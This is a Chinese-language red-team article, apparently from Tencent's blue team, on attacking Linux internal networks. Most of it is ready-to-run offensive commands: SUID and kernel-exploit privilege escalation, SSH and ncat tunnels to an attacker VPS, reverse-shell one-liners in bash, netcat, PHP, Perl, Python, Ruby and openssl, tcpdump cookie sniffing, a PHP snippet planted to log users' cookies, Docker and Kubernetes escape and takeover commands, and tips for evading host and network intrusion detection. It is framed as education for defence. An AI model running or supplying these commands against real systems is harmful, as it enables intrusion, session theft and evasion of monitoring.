
# 红蓝对抗之Linux内网渗透

# 前言

上篇[内网渗透](https://mp.weixin.qq.com/s/OGiDm3IHBP3_g0AOIHGCKA)(附录1)主要讲的是Windows这块，最近知识星球“腾讯安平密友圈”提到了一个问题**“为什么内网渗透偏向于Windows”**，笔者也在下面进行了相关回复，除了传统的信息收集、弱口令以外，Linux内网渗透也有很多可玩性。  
![36ddcc37-f268-4903-a158-303415e46ded](assets/1700701638-6fa75989e9ad274035d76592a496dd92.jpg)

在服务器方面，Linux由于开源、稳定、灵活、社区支持等因素，市场占有率远比Windows大，并且广大业务逐步上云使用docker容器等原因，所以Linux渗透攻击也是蓝军极为常见和必备的技能。

本文将以蓝军攻击视角，介绍常用的Linux内网渗透的手法，包括提权、隧道、反弹shell、登录态、云安全和工具化，主要让大家了解内网渗透的手法和危害，以攻促防，希望能给安全建设带来帮助。

# 提权

Linux不像Windows有那么多的提权EXP，不会动不动就出现各种烂土豆系列，因此Linux提权常常成为一个难点。本章将介绍一些Linux上的提权手法。

## 利用内核漏洞进行提权

脏牛漏洞(CVE-2016-5195)是一个影响2007年-2016年长达9年发行的Linux系统的提权漏洞，恶意用户可以利用条件竞争获取ROOT权限。  
这里以写文件的手段来演示下该漏洞利用方法。  
本次漏洞环境如下：  
![image-20201207195401288](assets/1700701638-01a0bb848f22a4c7d2177ff5cc51a221.png)  
根目录下存在test.txt：  
![image-20201207195115789](assets/1700701638-c97724626d283587a4a29847fbc43fa7.png)  
普通用户只能查看而不能修改：  
![image-20201211183207597](assets/1700701638-2fce85c67d26cce457c69aae32abbdcd.png)  
利用exp成功写入文件到只读文件中：  
![image-20201207195235196](assets/1700701638-e8c89df185b2e86b8c2a31c74c87117d.png)  
附上该漏洞的POC集合地址：  
[https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)

笔者不太喜欢用此类EXP，包括Window上的溢出类漏洞，因为此类漏洞有可能会导致系统崩掉，对于客户环境、敏感系统还是慎用。  
针对此类漏洞有些同学会有如下疑问：  
Q:为什么我执行以后会卡死？  
A:尝试使用反弹的方式，即交互式/半交互式的方法进行。

## 文件权限配置不当

当某个进程启动权限为ROOT，对应文件编辑权限为普通用户时，我们可以利用该问题点进行提权。  
[pspy](https://github.com/DominicBreuker/pspy)(附录2)工具提供了普通用户权限即可监听进程信息，该工具原理很简单，循环遍历/proc下的值来获取进程参数信息：  
![image-20201209121534075](assets/1700701638-f1f38261e63811c92e2a847a87818910.png)  
如果我们设置hidepid，该工具就会失效，如：

```plain
mount -o remount,rw,hidepid=2 /proc
```

该工具就什么输出都不会有，或者只有问号：  
![image-20201209121656996](assets/1700701638-38dc20a124539ac2a37b9ff6f02eb1df.png)  
![image-20201209121703194](assets/1700701638-ddfd32fd46abec4eeeded82cd26ff414.png)  
这里我们使用pspy作为辅助演示(当没设置hidepid时)。  
前期准备中，首先我们创建一个while循环，并使用ROOT用户循环执行/tmp/1.sh。然后当我们获取USER普通用户权限时，利用pspy可以监控到ROOT用户在持续执行/tmp/1.sh：  
![image-20201209124026554](assets/1700701638-9e28e1bb73baeafff34899897a53c6cd.png)  
尝试查看/tmp/1.sh文件内容和权限，发现我们当前用户具备读写权限：  
![image-20201209124046231](assets/1700701638-c78b261cf805f353b49956559144c218.png)  
我们尝试替换文件内容，查看是否会以ROOT权限启动其中命令：  
![image-20201209123811440](assets/1700701638-6c52a10066ed0ba82a9efb0597f564c4.png)  
发现成功提权，以ROOT权限启动自定义命令：  
![image-20201209124124473](assets/1700701638-2ae1742c9443fccd1626b8ea33407df7.png)

## 利用SUID程序进行提权

当程序运行需要高权限，但是用户不具备高权限时，这时则可以给文件设置SUID，使得用户在执行文件时将以文件所有者的权限来运行文件，而不是运行者本身权限。  
首先/tmp/test存在如下文件：  
![image-20201209143707678](assets/1700701638-15f7219c521699588ad6f665500c71dd.png)  
正常执行结果如下：  
![image-20201209143841022](assets/1700701638-42488ae6afd3a9c2193bf473fadda613.png)  
当设置SUID时，执行结果如下：

```plain
chmod +s ./test
```

![image-20201209144236378](assets/1700701638-fc7b55d2d7bd9444079469be2f663ab9.png)  
![image-20201209144219105](assets/1700701638-fa18217011cfac4a7edc72e52584ccf5.png)  
执行结果依然是当前用户，为何？  
这是因为在[高版本Linux](https://linux.die.net/man/1/bash)(附录3)中，如果启动bash的的Effective UID与Real UID不相同，而且没有使用-p参数，则bash会将Effective UID还原成Real UID。即如果就算有S位，但没有使用-p参数，则最终执行的权限依然是当前用户的权限。  
可以使用[setuid](https://man7.org/Linux/man-pages/man2/setuid.2.html)(附录4)使得bash当前Effective UID和Real UID相同来达到提权效果：

1.  `#include<stdlib.h>`
2.  `main()`
3.  `{`
4.  `setuid(0);`
5.  `system("whoami > /tmp/test.txt");`
6.  `}`

![image-20201209153709020](assets/1700701638-16aae505764ada1a7762f2fba3c996e5.png)  
我们可以使用如下命令来寻找服务器上设置了SUID的应用程序：

```javascript
find / -perm -u=s -type f 2>/dev/null
```

![image-20201209154404269](assets/1700701638-8a2b1e05382e7a0670934cc4e142460b.png)  
下面列举几个常见的设置了SUID的应用程序提权手段。

-   nmap
    
    1.  `nmap --interactive`
    2.  `!sh`
    
-   find
    
    ```python
    find . -type f -exec /bin/bash \;
    ```
    
-   awk
    
    ```sql
    awk 'BEGIN {system("/bin/bash")}'
    ```
    
-   strace
    
    ```coffeescript
    strace -o/dev/null /bin/bash
    ```
    

# 隧道

Linux上可以利用自带和第三方工具进行隧道开启，利用隧道，我们可以建立Socks连接、端口转发等操作。

## SSH

Linux上耳熟能详的就是SSH了，我们来看下SSH常用的开启隧道的命令。

-   场景a：在控制A机器时，利用socks代理进入A机器所在内网
    
    1.  `ssh -qTfnN -D 1111 [root@1.1.1](mailto:root@1.1.1).1`
    
    输入A机器密码，本地利用proxychains等类似工具连接本地的1111端口的sock5连接即可代理A机器的网络。

-   场景b：如果控制A、B机器，A能够访问B，且能出网，B能够访问C，但不能出网，A不能访问C  
    A机器执行：
    
    1.  `ssh -CNfg -L 2121:CIP:21 root[@BIP](https://github.com/BIP "@BIP")`
    
    输入BIP机器密码，访问A的2121端口即是访问CIP的21端口。

-   场景c：控制A机器，A能够访问B  
    A机器执行：
    
    1.  `ssh -CNfg -R 2121:BIP:21 root[@hackervps](https://github.com/hackervps "@hackervps")`
    
    输入黑客VPS密码，访问黑客VPS的2121端口即是访问BIP的21端口。

## nc/ncat

服务端执行监听命令：

```css
ncat --sh-exec "ncat 127.0.0.1 22" -l 80 --keep-open
```

客户端连接服务端的80端口即可SSH连接：

```plain
SSH root@serverip -p 80
```

## portmap

服务端执行：

```css
portmap -m 1 -p1 80 -h2 127.0.0.1 -p2 22
```

客户端连接服务端的80端口即可SSH连接：

```plain
SSH root@serverip -p 80
```

## portfw

服务端执行：

```css
tcpfwd 0.0.0.0:443 127.0.0.1:22
```

客户端连接服务端的443端口即可SSH连接：

```plain
SSH root@serverip -p 443
```

# 反弹shell

Linux上也存在一些自带命令/工具，来进行反弹shell得到一个(非)交互式shell。  
下述命令中的yourip为攻击者监听的ip；yourport为攻击者监听的端口。

## bash

```plain
bash -c 'exec bash -i &>/dev/tcp/yourip/yourport <&1'
```

## netcat

```plain
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc yourip yourport >/tmp/f
```

## php

```plain
php -r '$sock=fsockopen(getenv("yourip"),getenv("yourport"));exec("/bin/sh -i <&3 >&3 2>&3");'
```

## perl

```plain
perl -e 'use Socket;$i="$ENV{yourip}";$p=$ENV{yourport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## python

1.  `python -c 'import sys,socket,os,pty;s=socket.socket()`
2.    `s.connect((os.getenv("yourip"),int(os.getenv("yourport"))))`
3.    `[os.dup2(s.fileno(),fd) for fd in (0,1,2)]`
4.    `pty.spawn("/bin/sh")'`

## ruby

```plain
ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["yourip"],ENV["yourport"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## telnet

```ruby
TF=$(mktemp -u); mkfifo $TF && telnet 127.0.0.1 1337 0<$TF | /bin/sh 1>$TF
```

## openssl 加密

服务端生成证书：

```plain
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

服务端监听：

```css
openssl s_server -quiet -key key.pem -cert cert.pem -port 8888
```

受控端执行：

```ruby
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect yourip:yourport > /tmp/s; rm /tmp/s
```

## 完全交互式shell

attack端执行：

```plain
stty -echo raw; nc -lp 1337; stty sane
```

victim端执行：

```plain
nc -c '/bin/bash -c "script /dev/null"' yourip 1337
```

现在ctrl c也不会退出：  
![image-20201211103704421](assets/1700701638-7766eba1fe95df69854ea6da4966536c.png)

# 登录态

现在越来越多的系统接入SSO、零信任，用户友好度提升了，但是也伴随了大量风险，比如如果单点故障了怎么办。其他安全风险呢？如果我们拿下其中一台可信服务器的权限，是否也伴随着未做隔离的站点也沦为了能快速拿权限的攻击目标？

## tcpdump

tcpdump是一款网络抓包的程序，在SSO、零信任的场景中，我们可以利用它来获取用户的登录态、Cookie等敏感信息，然后利用这些信息去登录其他未做隔离的站点。  
下面是抓取http数据包的命令示例：

```plain
tcpdump -i eth1 -s 0 -A 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420 or tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354'
```

## 网站文件

除了使用抓包工具去进行敏感信息的抓取，我们还可以在网站本身去做一下手脚。  
比如网站是php的，那我们可以在配置文件文件中，插入恶意代码，获取Cookie等信息，下面是代码示例：

1.  `<?php`
2.  `$fp = fopen('/var/www/html/site/cookies.txt', 'a');`
3.  `fwrite($fp,json_encode($_COOKIE).PHP_EOL);`
4.  `fclose($fp);`

# 云安全

现在越来越多的业务开始上云，使用容器部署业务，那随之而来的也是对应的安全风险，包括不限于未授权访问、命令执行等漏洞。

## docker

### 判断是否是docker环境

-   进程数很少，比如少于10条  
    ![image-20201209185320827](assets/1700701638-a076af108e3b34f7d5c411aad724f8cb.png)
-   常见的命令却没有，如没有wget命令  
    ![image-20201209185457364](assets/1700701638-e7817170afbc14a1a941fc0eabe5d785.png)
-   存在/.dockerenv文件  
    ![image-20201209185515825](assets/1700701638-6acc9f4567584d16f75c073e5897c402.png)
-   /proc/1/cgroup内包含”docker”字符串  
    ![image-20201209185522787](assets/1700701638-a6548ea8fd3933de610cb3cc2a9aad2f.png)

### 逃逸

逃逸是指我们在容器中逃逸到宿主机中。

#### 特权容器

当容器是以特权启动时，docker将允许容器访问宿主机上的所有设备。  
如下容器是进行特权启动(docker run —privileged)的，我们可以把宿主机磁盘挂载进容器里，然后进行相关的逃逸操作，包括不限于更改计划任务、文件。

1.  `fdisk -l|grep /dev/vda1`
2.  `mkdir /test`
3.  `mount /dev/vda1 /test`
4.  `chroot /test`

![image-20201209191036954](assets/1700701638-01312a0f3d0dfb7f540cb5ee0dbe9f68.png)

#### Docker Socket

/var/run/docker.sock文件是Docker守护进程默认监听的Unix域套接字，容器中的进程可以通过该文件与docker守护进程进行通信。  
![img](assets/1700701638-0b889ae40be96c333be893e3cf666217.png)  
当攻击者可控的容器内挂载了该文件，我们也可以对其进行逃逸。  
首先我们用如下命令创建一个特权测试容器：

```coffeescript
docker run -itd -v /var/run/docker.sock:/var/run/docker.sock  d6e46aa2470d
```

比如我们控制了上述容器，并发现其挂载了docker.sock：

![image-20201209200847051](assets/1700701638-a703bbc39b3a4c924b5e765823a1c4f7.png)  
那么我们可以利用/var/run/docker.sock创建特权容器（附录5）：

1.  `docker -H unix:///var/run/docker.sock pull alpine:latest`
2.  `docker -H unix:///var/run/docker.sock run -d -it --name rshell -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest`
3.  `docker -H unix:///var/run/docker.sock start rshell`
4.  `docker -H unix:///var/run/docker.sock exec -it rshell /bin/sh`

最终发现逃逸成功：  
![image-20201209201050084](assets/1700701638-86ee4cb2cd19da506a0d894d4607ee40.png)

#### 脏牛

利用漏洞章节处的脏牛漏洞提权也可以达到逃逸目的，这里不重复演示。  
POC地址：  
[https://github.com/scumjr/dirtycow-vdso](https://github.com/scumjr/dirtycow-vdso)

### 未授权访问

当默认端口为2375的Docker Remote API对外未授权开放时，攻击者可以利用该漏洞进行getshell。  
未授权测试过程：  
获取所有images列表：

```plain
curl http://host:2375/containers/json
```

获取运行中的容器：

```plain
docker -H tcp://host:2375 ps
```

getshell过程：  
获取镜像:

```plain
docker -H tcp://host:2375 images
```

根据镜像创建容器，把宿主机根目录挂载到容器中：

```ruby
docker -H tcp://host:2375 run -it -v /:/mnt/ image_id /bin/bash
```

创建容器后没自动进入容器的话，可以利用ps查看创建容器的CONTAINER ID：

```plain
docker -H tcp://host:2375 ps
```

然后进入容器:

```plain
docker -H tcp://host:2375 exec -it CONTAINERID sh
```

默认执行命令只能看到容器内的：  
![image-20201210133100026](assets/1700701638-e983a9c3f66a60faedef61ea15a18593.png)  
进入到挂载进来的磁盘中，并切换根目录，则可以看到宿主机进程：

```plain
chroot /mnt sh
```

![image-20201210133155263](assets/1700701638-abd118e496a9edfecd6f5a20535656b7.png)  
因为挂载把宿主机根目录挂载到了容器中的/mnt目录中，就再次回到了上述逃逸的攻击手段了，其他就不再赘述。

## kubernetes

kubernetes简称k8s，简单理解是拿来自动化部署容器、管理容器的框架。

### API Server攻击

当我们获取到admin token时，可以操作API Server来控制集群。

```plain
curl -H "Authorization: Bearer $TOKEN" $APISERVER/api  --insecure
```

也可以把admin token放置在~/.kube/config文件中，然后利用命令行工具进行后续操作：

1.  `kubectl get namespaces`
2.  `kebectl get pods -n {namespaces}`
3.  `kubectl exec -it -n {namespace} {podname} /bin/sh`

### kubelet 10250端口攻击

10250端口是kubelet API的HTTPS端口，该端口提供了pod和node的信息，如果该端口对外开放，攻击者可以利用公开api来获取敏感信息，甚至执行命令。

```plain
curl -k https://host:10250/pods
```

![image-20201210191528031](assets/1700701638-7b21b537a7699f6e22712c0619a6cdfd.png)  
根据上述获取到的信息在容器中执行命令：

1.  `curl -Gks https://host:10250/exec/{namespace}/{podname}/{containername} \`
2.  `-d 'input=1' -d 'output=1' -d 'tty=1' \`
3.  `-d 'command=whoami'`

上述命令得到websocket地址，连接websocket得到命令结果：

```plain
wscat -c "https://host:10250/websocket" --no-check
```

当获取到admin token后，也可以利用该服务端口在pod中执行命令：

```ruby
curl -k -H "Authorization: Bearer $TOKEN" https://host:10250/run/{namespace}/{podname}/{containername} -XPOST -d 'cmd=whoami'
```

### etcd 2379端口攻击

etcd中存放着k8s集群数据，如果可以成功访问该服务端口，则可以获取集群中的敏感信息，包括k8s secrets、admin token、AKID等。

```plain
etcdctl --endpoints=https://host:2379 ls
```

带着cert访问etcd：

```plain
etcdctl --endpoints=https://host:2379 --cacert=ca.crt --key=etcd.key --cert=etcd.crt endpoint health
```

# IDS

本章介绍的IDS包括HIDS和NIDS。

## HIDS

HIDS涉及到如何绕过服务器上的agent。  
业务服务器上默认都部署了agent，如何绕过这些agent也是一个很大的学问。这些agent常常会hook execve来获取和判断执行的命令是否恶意。  
这里有几个思路和大家一起讨论：

-   滞空LD\_PRELOAD来绕过用户态的hook，busybox同理
-   利用代码来执行命令
-   利用ptrace进行日志混淆
-   关闭或致盲agent通信

## NIDS

NIDS涉及到如何绕过网络设备进行扫描。  
在内网渗透中，我们会使用nmap去做网络探测，而nmap自带的一些特征会导致被安全设备识别和拦截。因此我们需要对nmap做一些修改，比如更改nselib/http.lua，把nmap字样删除：  
![image-20201211101437662](assets/1700701638-72390f5104dfc0b001d06dcf70beba1e.png)  
tcpip.cc更改windows窗口大小：  
![image-20201211101737360](assets/1700701638-524ee94c9207ec1c12af3e4bd5084717.png)  
nselib/rdp.lua更改3389 cookie：  
![image-20201211102025934](assets/1700701638-244857eaf47d8b3f2c05e6b9fa5ecd49.png)  
也可以利用ipv6进行绕过(附录6)。  
也可以利用curl进行简单的探测，curl能获取banner信息：  
![image-20201211103112173](assets/1700701638-aa82f408fab692054a996b12ec8432c8.png)

# 工具化

当我们拿下跳板机/堡垒机此类服务器权限时，上面可用的命令少之又少，甚至连whoami都没有！  
因此我们需要编写一些适用的小工具来帮我们完成一些指定的工作，包括curl、反弹shell：  
![6dbfd1ec-e5eb-4fbe-ac68-405c19cb47bc](assets/1700701638-97f1990e366256534d737e62de952727.png)

# 总结

内网渗透博大精深，进入内网如何在不被发现的情况下快速获取目标权限也是重中之重，本系列的文章也只是抛砖引玉。腾讯蓝军也会持续和大家分享更多攻防知识，希望能够和大家共同成长，提高整体红蓝对抗水平。

文中涉及的技术信息，只限用于技术交流，切勿用于非法用途。欢迎探讨交流，行文仓促，不足之处，敬请不吝批评指正。

**腾讯蓝军**

腾讯蓝军（Tencent Force）由腾讯TEG安全平台部于2006年组建，十余年专注前沿安全攻防技术研究、实战演练、渗透测试、安全评估、培训赋能等，采用APT攻击者视角在真实网络环境开展实战演习，全方位检验安全防护策略、响应机制的充分性与有效性，最大程度发现业务系统的潜在安全风险，并推动优化提升，助力企业领先于攻击者，防患于未然。

【附录】  
附录1 windows内网渗透: [https://mp.weixin.qq.com/s/OGiDm3IHBP3\_g0AOIHGCKA](https://mp.weixin.qq.com/s/OGiDm3IHBP3_g0AOIHGCKA)  
附录2 pspy: [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)  
附录3 bash: [https://Linux.die.net/man/1/bash](https://linux.die.net/man/1/bash)  
附录4 setuid: [https://man7.org/linux/man-pages/man2/setuid.2.html](https://man7.org/linux/man-pages/man2/setuid.2.html)  
附录5 创建特权容器: [https://github.com/neargle/cloud\_native\_security\_test\_case](https://github.com/neargle/cloud_native_security_test_case)  
附录6 利用ipv6绕过ids: [https://security.tencent.com/index.php/blog/msg/147](https://security.tencent.com/index.php/blog/msg/147)  
附录7 curl: [https://github.com/SYM01/gosnippets/blob/main/curl/curl.go](https://github.com/SYM01/gosnippets/blob/main/curl/curl.go)
